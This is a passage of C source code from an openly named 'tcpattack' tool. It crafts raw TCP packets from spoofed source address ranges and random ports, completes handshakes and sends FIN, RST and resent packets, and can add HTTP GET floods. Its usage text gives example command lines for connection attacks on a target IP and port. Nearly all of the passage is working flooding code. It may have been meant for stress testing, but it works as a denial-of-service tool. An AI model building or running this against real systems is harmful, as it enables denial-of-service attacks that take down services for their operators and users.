                                        update_ack_hash_table(/*inet_addr(sourceIp)*/inet_addr(destIp), /*ntohs(tcpkt->dest)*/ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pHttpUserStatus[iuserid].iSockFd, 1);	
                                        int isendsize = -1;
                                        //printf("======recv http syn+ack,send http ack %s %d======\n", destIp, ntohs(sendtcp->source));
                                        isendsize = sendto(m_pHttpUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                        if(isendsize < 0)
                                        {
                                            printf("======send http ack message failed======\n");
                                        }
                                        send_http_get_fun(m_pHttpUserStatus[iuserid].iSockFd, inet_addr(destIp), inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq));
                                        update_httpget_hash_table(inet_addr(destIp), ntohs(sendtcp->source), 0);
                                        item->getFlag = 1;
                                    }
                                }
                                else
                                {
                                    update_syn_hash_table(inet_addr(destIp), ntohs(sendtcp->source)/*m_pHttpUserStatus[iuserid].cSendSrcPort*/, m_pHttpUserStatus[iuserid].cSynSeq, m_pHttpUserStatus[iuserid].cSynAck, m_pHttpUserStatus[iuserid].iSockFd, 1);
                                    update_synack_hash_table(inet_addr(destIp), ntohs(sendtcp->source)/*ntohs(sendtcp->source)*//*ntohs(tcpkt->dest)*/, ntohl(tcpkt->seq), ntohl(tcpkt->ack_seq), tcpkt->syn, tcpkt->ack, m_pHttpUserStatus[iuserid].iSockFd, 1);
                                    update_ack_hash_table(inet_addr(destIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq), m_pHttpUserStatus[iuserid].iSockFd, 1);
                                    
                                    int isendsize = -1;
                                    printf("======recv http syn+ack, send http ack %s,%d======\n", destIp, ntohs(sendtcp->source));
                                    isendsize = sendto(m_pHttpUserStatus[iuserid].iSockFd, cSendbuff, sizeof(struct iphdr)+sizeof(struct tcphdr), 0, (struct sockaddr *)(&addr), sizeof(struct sockaddr_in));
                                    if(isendsize < 0)
                                    {
                                        printf("======send http ack message failed======\n");
                                    }
                                    //(int socket, unsigned long saddr, unsigned long daddr, int sport, unsigned long seq, unsigned long ack)
                            
                                    send_http_get_fun(m_pHttpUserStatus[iuserid].iSockFd, inet_addr(destIp), inet_addr(sourceIp), ntohs(sendtcp->source), ntohl(sendtcp->seq), ntohl(sendtcp->ack_seq));
                                    update_httpget_hash_table(inet_addr(destIp), ntohs(sendtcp->source), 1);
                                    //item->getFlag = 1;
                                }
                            }
                                m_pHttpUserStatus[iuserid].iUserStatus = RECV_OK;
                                m_HttpSockFd_UserId[iclientsockfd] = iuserid;
                                event_nfds.data.fd = iclientsockfd;
                                event_nfds.events = EPOLLOUT|EPOLLET;
                                epoll_ctl(epollFd, EPOLL_CTL_MOD, event_nfds.data.fd, &event_nfds);
                            }
                        }
                    }
                }
            }
        }
    }
    //pthread_create(&thrd_while_read, NULL, slave_while_read_thread, (void *)socketNum);
}

void stop (int sig) 
{
    if(finFlag == 1)
    {
        pthread_kill(thrd_check_fin, SIGINT);
        pthread_kill(thrd_check_connect, SIGINT);
    }
    if(rstFlag == 1)
	pthread_kill(thrd_check_rst, SIGINT);
    if(resendFlag == 1)
	pthread_kill(thrd_check_resend, SIGINT);
    if(httpGetFlag == 1)
    {
        //pthread_kill(thrd_http_get, SIGINT);
        //pthread_kill(thrd_while_read, SIGINT);
    }
    int m;
    for(m=0;m<5;m++)
    {
        pthread_kill(thrd_check_recv_packet[m], SIGINT); 
        close(socketfd[m]);
        close(socketHttpfd[m]);
    }
    struct tcp_status *item = NULL;
    int i, connectNum = 0;
    for(i=0;i<m_iUserCount;i++)
    {
	if(m_pAllUserStatus[i].iSockFd != 0)
        close(m_pAllUserStatus[i].iSockFd);
    }
    if(m_pAllUserStatus != NULL)
    //free(m_pAllUserStatus);

    for(i=0;i<65535;i++)
    {
	if(httpSocket[i] != 0)
        close(httpSocket[i]);
    }
    exit(-1);
    return;
}

void usage()
{
    printf("tcpattack:\n");
    printf("-s: source ip and mask, eg: 1.2.3.4/32, 1.2.3.4/24\n");
    printf("-u: auto get the source address, eg: -n auto\n");
    printf("-p: source port, argument is port number or \"random\"\n");
    printf("-d: dest ip, single ip\n");
    printf("-t: dest target port, argument is port number\n");
    printf("-f: send fin packet flag, 1 is open\n");
    printf("-r: send rst packet flag, 1 is open (reserved)\n");
    printf("-w: set tcp window size\n");
    printf("-a: attack ratio default 100%, argument eg: 0.3 0.5 0.8\n");
    printf("-n: attack send flownum, resend packet num, resend packet type, argument eg: -n 1-10-ack (syn ackforsyn fin ackforfin )\n");
    printf("-g: tcpattack with http get, useed with attack ratio, argument is URL\n");
    printf("-h: help info\n");

    printf("example:\n");
    printf("tcpattack -s 172.168.1.6/32 -p random -d 172.168.1.13 -t 80 (random src port connection attack)\n");
    printf("tcpattack -s 172.168.1.6/32 -p random -f 1 -d 172.168.1.13 -t 80 (random src port connection attack and fin)\n");
    printf("tcpattack -s 172.168.1.6/32 -p 1000-5000 -d 172.168.1.13 -t 80 (given src port range connection attack)\n");
    printf("tcpattack -s 172.168.1.6/32 -p random -d 172.168.1.13 -t 80 -n 10-10-syn (random src port connection attack and resend 10 flows 10 syn packet)\n");
    printf("tcpattack -s 172.168.1.6/32 -p random -f 1 -d 172.168.1.13 -t 80 -n 10-10-fin (random src port connection attack and resend 10 flows 10 fin packet)\n");
    printf("tcpattack -s 172.168.1.6/32 -p 1-65535 -d 172.168.1.13 -t 80 -a 0.8 -g http://172.168.1.13:80 (connection attack src port range proportion and httpget)\n");
}

void init_tcp_status_hash_list()
{
    int i;
    for(i=0;i<STATUS_LIST_HASH_SIZE;i++)
    g_tcp_status_list[i] = NULL;
}

void init_http_status_hash_list()
{
    int i;
    for(i=0;i<STATUS_LIST_HASH_SIZE;i++)
	g_http_status_list[i] = NULL;
}

void slave_check_statistics_thread(void *arg)
{
    int upsideTotal = 0;
    while(1)
    {
        char tmpbuf[1024] = "";
        upsideTotal = sendSynPacketNum;
        sleep(1);

        int sendSynPps = sendSynPacketNum - upsideTotal;
        printf("send syn packet pps %d/pps\n", sendSynPps);

        printf("tcpattack: send syn packet total: %d\n", sendSynPacketNum);
        printf("tcpattack: recieve syn+ack packet num: %d\n", recvSynAckPacketNum);
        printf("tcpattack: three handshake success num: %d\n\n", threeHandshakeNum);

        sprintf(tmpbuf, "echo \"tcpattack: send syn packet total: %d\ntcpattack: recieve syn+ack packet num: %d\ntcpattack: three handshake success num: %d\n\n\" >> %s", sendSynPacketNum,recvSynAckPacketNum, threeHandshakeNum, LOGFILE);
        system(tmpbuf);

        if(finFlag == 1)
        {
            char tmpbuf1[1024] = "";
            printf("tcpattack: send fin packet num is: %d\n", sendFinPacketNum);
            printf("tcpattack: recieve fin+ack packet is: %d\n", recvFinAckPacketNum);
            printf("tcpattack: send ack for fin stop connect num: %d\n\n", sendAckForFin);

            sprintf(tmpbuf1, "echo \"tcpattack: send fin packet num is: %d \ntcpattack: recieve fin+ack packet is: %d\ntcpattack: send ack for fin packet num is: %d\n" >> %s", sendFinPacketNum, recvFinAckPacketNum, sendAckForFin, LOGFILE);
            system(tmpbuf1);
        }
        if(rstFlag)
        {
            printf("tcpattack: send rst packet num is: %d\n\n", sendRstPacketNum);
        }
	
        if(httpGetFlag == 1)
        {
            char tmpbuf[1024] = "";
            printf("tcpattack: send http get total: %d \n", httpGetNum);
            printf("tcpattack: recieve http respond num: %d\n", httpRespondNum);
            printf("tcpattack: recieve http respond error num: %d\n", httpRespondErrorNum);
            printf("tcpattack: recieve http 302 jump num: %d \n\n", httpRespond302Num);

            sprintf(tmpbuf, "echo \"tcpattack: send http get total: %d \n tcpattack: recieve http respond num: %d \ntcpattack:  http 302 jump num: %d \n\n\" >> %s", httpGetNum, httpRespondNum, httpRespond302Num, LOGFILE);
            system(tmpbuf);
        }

        if(sPortType == RANDOMPORT)
        {
            if(threeHandshakeNum > srcPortNum)
            {
                stop(0);
            }
            if(threeHandshakeNum == srcPortNum || threeHandshakeNum+1 == srcPortNum)
            {
            stop(0);
            }
        }
        upsideTotal = sendSynPacketNum;
    }
}

ipv4_t util_local_addr(void)
{
    int fd;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof (addr);

    errno = 0;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[util] Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);

    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
    return addr.sin_addr.s_addr;
}

int main(int argc, char *argv[])
{
    char c;
    char dstip[16] = "";
    char srcmask[32] = "";
    char srcip[32] = "";
    char dstport[32] = "";
    char cleanFile[512] = "";
    struct sigaction newaction;
                
    newaction.sa_handler = stop;
    sigemptyset(&newaction.sa_mask);
    sigaddset(&newaction.sa_mask,SIGTERM);      
    sigaddset(&newaction.sa_mask,SIGINT);
    sigaddset(&newaction.sa_mask,SIGSEGV);
    sigaction(SIGTERM,&newaction,NULL);
    sigaction(SIGINT,&newaction,NULL);
    sigaction(SIGSEGV,&newaction,NULL);
  
    if(access("tcpattack.log", F_OK)==0)
    {
	    printf("tcpattack.log file exist\n"); 
    }
    else
        system("touch tcpattack.log");

    sprintf(cleanFile, "echo \"\" > %s", "./tcpattack.log");
    system(cleanFile);

    int attackRatio;
    float ratio;
    int srcIpMode = 0;
    struct in_addr sIP;
    ipv4_t LOCAL_ADDR;

    while ((c = getopt(argc, argv, "s:up:d:t:v:w:a:n:lg:rfjkh::")) != EOF)
    {
        switch(c)
        {
	    case 's':
            srcIpMode = SPECIFYSRCIP;
            strcpy(srcip, optarg);
            printf("tcpattack src ip is: %s\n", srcip);
            break;
	    case 'u':
    		LOCAL_ADDR = util_local_addr();
    		sIP.s_addr = LOCAL_ADDR;
    		strcpy(srcip, inet_ntoa(sIP));
    		printf("tcpattack: src ip is %s\n", srcip);
            break;
	    case 'p':
            printf("tcpattack: src port is %s\n", optarg);
            if(strstr(optarg, "-"))
            {
                sPortType = RANGEPORT;
                char start[16] = "", end[16] = "";
                char *ptr = strstr(optarg,"-");
                strncpy(start, optarg, strlen(optarg)-strlen(ptr));
                strcpy(end, optarg + strlen(start) + 1); 

                startPort = atoi(start);
                endPort = atoi(end);
                srcPortNum = endPort - startPort;
                attackEndPort = endPort;

                socketNum = endPort - attackEndPort;
                printf("tcpattack: src port arg is %s, start port is %d, end port is %d, total port num is: %d\n", optarg, startPort, endPort, srcPortNum);
            }
            else
            {
                strcpy(s_iPort, optarg);
                if(!strncmp(s_iPort, "random", strlen(s_iPort)))
                {
                    sPortType = RANDOMPORT;
                srcPortNum = 254 *65535;
                }
                else
                {
                sPortType = SPECIFYSRCIP;
                    //src_iPort = 1;
                }
            }
            break;
	    case 'd':
            strcpy(dstip, optarg);
            printf("tcpattack dest ip is: %s\n", dstip);
            break;
        case 't':
            strcpy(dstport, optarg);
            printf("tcpattack dest port is: %s\n", dstport);
            break;
	    case 'f':
            finFlag = 1;//atoi(optarg);
            printf("tcpattack with send fin packet flag %d, 1 is effect\n", finFlag);
            break;
	    case 'r':
            rstFlag = 1;//atoi(optarg);	
            printf("tapattack with send rst packet flag %d, 1 is effect\n", rstFlag);
            break;
	    case 'w':
            windowSize = atoi(optarg);
            windowFlag = 1;
            printf("tcpattack set window size %d (syn packet)\n", windowSize);
            break;
        case 'a':
            ratio = atof(optarg);
            attackEndPort = startPort + srcPortNum * ratio;
            printf("tcpattack ratio is %f, attack port is from %d to %d, reserve port for httpget from %d to %d\n", ratio, startPort , attackEndPort, attackEndPort, endPort);
            break;
        case 'l':
            httpLoopGetFlag = 1;
            printf("tcpattack loop http get flag %d\n", httpLoopGetFlag);
            break;
	    case 'g':
            httpGetFlag = 1;
            strcpy(httpGetUrl, optarg);
            printf("tcpattack with http get, url is :%s\n", httpGetUrl);
            char *ptr = strstr(httpGetUrl, "/");
            if(ptr != NULL)
                strcpy(httpGetHead, ptr);
            strncpy(httpGetHost, httpGetUrl, strlen(httpGetUrl)-strlen(httpGetHead));
            printf(" httpGetHead %s,httpGetHost %s\n", httpGetHead, httpGetHost);
            break;
	    case 'j':
            http302Redirect = 1;	
            printf("tcpattack http get 302 redirect respond %d\n", http302Redirect);
            break;
        case 'k':
            httpGetKeepAlive = 1;
            printf("tcpattack http get keep-alive mode %d\n", httpGetKeepAlive);
            break;
        case 'n':
            if(strstr(optarg, "-"))
            {
                char *ptr = strstr(optarg,"-");
                char type[16] = "";char flowNum[16] = "";char sendNum[16] = "";
                strncpy(flowNum, optarg, strlen(optarg)-strlen(ptr));
                char *ptr2 = strstr(ptr+1, "-");
                strncpy(sendNum, optarg+strlen(flowNum)+1, strlen(optarg) - strlen(ptr2)- strlen(flowNum) -1);
                strncpy(type, optarg+strlen(flowNum)+1+strlen(sendNum)+1, strlen(ptr2)-1);

                printf("tcpattack resend packet flownum %s, resend packt num %s, resend packet type %s\n", flowNum, sendNum, type);

                resendFlag = 1;
                resendFlowNum = atoi(flowNum);
                resendNum = atoi(sendNum);
                if(!strncmp(type, "syn", strlen(type)))
                {
                    resendType = RESEND_SYN;
                }
                else if(!strncmp(type, "ackforsyn", strlen(type)))
                {
                    resendType = RESEND_ACK_FOR_SYNACK;
                }
                else if(!strncmp(type, "fin", strlen(type)))
                {
                    resendType = RESEND_FIN;
                }
                else if(!strncmp(type, "ackforfin", strlen(type)))
                {
                    resendType = RESEND_ACK_FOR_FINACK;
                }
            }
            break;
	    case 'h':
            usage();
            exit(0);
        default:
            usage();
            exit(0);
            break;
        }
    }
    if(strlen(srcip) == 0)
    {
        usage();
        exit(0);
    }
    if(srcIpMode == SPECIFYSRCIP)
    {
        if(!strstr(srcip, "/"))
        {
            usage();
            exit(0);   
        }
        char *ptr = strstr(srcip,"/");
        char atksrc[32] = "";
        char atkmask[16] = "";
        strncpy(atksrc, srcip, strlen(srcip)-strlen(ptr));
        strcpy(atkmask ,srcip + strlen(atksrc) + 1);
        unsigned long addr_ip, addr_mask;
        unsigned long start_ip;
        addr_ip = inet_addr(atksrc);

        char tmp[20] = "";
        netmask_len2str(atoi(atkmask), tmp);
        addr_mask = inet_addr(tmp);

        unsigned long addr_max_ip = (addr_ip&addr_mask)^(~addr_mask);
        start_ip = ntohl(addr_ip&addr_mask)+1;
  
        if(addr_mask == 0xFFFFFFFF)
        {
            unsigned char *p = (unsigned char *)&addr_ip; 
            sprintf(srcIpBuf[srcIpCount], "%u.%u.%u.%u", *p, p[1], p[2], p[3]);
            srcIpCount++;
        }
        else
        {
            while(start_ip < ntohl(addr_max_ip))
            {
                unsigned char *p = (unsigned char *)&start_ip;
	            sprintf(srcIpBuf[srcIpCount], "%u.%u.%u.%u", p[3], p[2], p[1], *p);
    	        srcIpCount++;
                start_ip += 1;
            }
        }
    }
    else
    {
	    sprintf(srcIpBuf[srcIpCount], "%s", srcip);
        srcIpCount++;
    }
    printf("src ip num %d\n", srcIpCount);
    if(srcIpCount > 1)
	multiIp = 1;

    init_tcp_status_hash_list();    
    init_http_status_hash_list();    
    CEpollClient(TCPSOCKETNUM, dstip, dstport, srcIpCount);
   
//send fin packet
    if(finFlag == TRUEFLAG)  
        pthread_create(&thrd_check_connect, NULL, slave_check_thread, (void *)NULL);    
//send ack for fin packet
    if(finFlag == TRUEFLAG)
        pthread_create(&thrd_check_fin, NULL, slave_check_fin_thread, (void *)NULL);   
//send rst packet
    if(rstFlag == TRUEFLAG)
	pthread_create(&thrd_check_rst, NULL, slave_check_rst_thread, (void *)NULL);
//send resend packet
    if(resendFlag == TRUEFLAG)
	pthread_create(&thrd_check_resend, NULL, slave_check_resend_thread, (void *)NULL);
//http get 
    if(httpGetFlag == TRUEFLAG)
    {
	int i;
	//pthread_create(&thrd_http_get, NULL, slave_http_get_thread, (void *)SOCKETNUM);
    //pthread_create(&thrd_check_httpack, NULL, slave_check_send_httpack_thread, (void *)NULL);    
    //pthread_create(&thrd_while_read, NULL, slave_while_read_thread, (void *)socketNum);
	for(i=0;i<5;i++)
	{
        pthread_create(&thrd_check_httpget_packet[i], NULL, slave_check_httpget_thread, (void *)i);    
	}

    //pthread_t thrd_send_request_url;
    //pthread_create(&thrd_send_request_url, NULL, slave_send_request_url_thread, (void *)NULL);    
    }
    int rNum;
    for(rNum=0;rNum<5;rNum++)	    
        pthread_create(&thrd_check_recv_packet[rNum], NULL, slave_check_recv_thread, (void *)rNum);    

    pthread_t thrd_check_ack;
    pthread_create(&thrd_check_ack, NULL, slave_check_ack_thread, (void *)NULL);

    pthread_create(&thrd_check_statistics_packet, NULL, slave_check_statistics_thread, (void *)NULL);
 
    //pthread_t tcp_thread;
    //pthread_create(&tcp_thread, NULL, RunEpollCient, (void*)NULL);
    RunEpollCient();
    
    while(1)
    {
	    sleep(3);
    }
}

